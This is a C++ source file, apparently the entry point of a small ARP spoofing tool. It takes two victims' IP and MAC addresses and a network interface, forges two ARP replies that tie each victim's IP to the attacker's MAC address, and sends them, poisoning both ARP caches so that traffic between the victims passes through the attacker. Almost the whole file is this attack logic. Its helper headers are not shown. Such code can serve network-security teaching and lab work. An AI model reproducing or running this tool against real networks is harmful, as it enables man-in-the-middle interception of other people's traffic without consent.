#include <cstdlib>
#include <iostream>
#include "ARP_packet.h"
#include "NetworkInterface.h"
#include "ARP_packetManager.h"
#include "SpoofArguments.h"

int main(int argc, char **argv) {
    try {
        SpoofArguments arguments(argc, argv);
        NetworkInterface networkInterface(arguments.getInterface());

        /* Perform ARP cache poison */
        if (arguments.getProtocol() == "arp") {
            ARP_packetManager *arpPacketManager = ARP_packetManager::getInstance();
            arpPacketManager->init(&networkInterface);

            ARP_packet *arpReply1 = ARP_packet::createReply(
                    networkInterface.getPhysicalAddress(),
                    arguments.getVictim2Ipv4Address(),
                    arguments.getVictim1MacAddress(),
                    arguments.getVictim1Ipv4Address()
            );
            ARP_packet *arpReply2 = ARP_packet::createReply(
                    networkInterface.getPhysicalAddress(),
                    arguments.getVictim1Ipv4Address(),
                    arguments.getVictim2MacAddress(),
                    arguments.getVictim2Ipv4Address()
            );

            arpPacketManager->send(arpReply1);
            arpPacketManager->send(arpReply2);

            delete arpReply1;
            delete arpReply2;
        }

    }
    catch (InvalidArgumentsException &e) {
        cerr << e.what() << endl;
        SpoofArguments::printUsage();
        return EXIT_FAILURE;
    }
    catch (exception &e) {
        cerr << e.what() << endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
